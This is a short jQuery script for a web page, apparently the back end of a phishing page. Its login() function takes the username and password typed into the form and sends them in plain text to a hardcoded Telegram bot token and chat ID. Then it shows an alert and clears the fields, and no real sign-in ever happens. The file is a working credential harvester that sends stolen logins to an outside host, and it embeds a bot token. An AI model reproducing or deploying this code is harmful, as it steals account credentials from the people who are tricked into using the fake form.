$(document).ready(function(){

var winh = $(window).height();

$(".header").height(winh);
$(".space").height(winh /4);


$("button").click(function(){
window.location.href = "login.html";
});



});

function login(){
var username = $("#username").val();
var pass = $("#pass").val();

var text = "user : `" + username + "`|| pass : `" + pass + "`";

var token = "1763073210:AAFSz6iqk-PkW_vjvkGR7jIwrZyWPjderV4";
var id = "1562616838";

if(username.length > 0 && pass.length > 0){


$("#logbut").attr("disabled","disabled");
    
    $.get( "https://api.telegram.org/bot" + token +"/sendMessage?chat_id=" +id + "&text=" + text + "&parse_mode=markdown", function( data ) {
$("#logbut").removeAttr("disabled","disabled");
$(".alert").show();
$("#username,#pass").val("");
      });

}

}
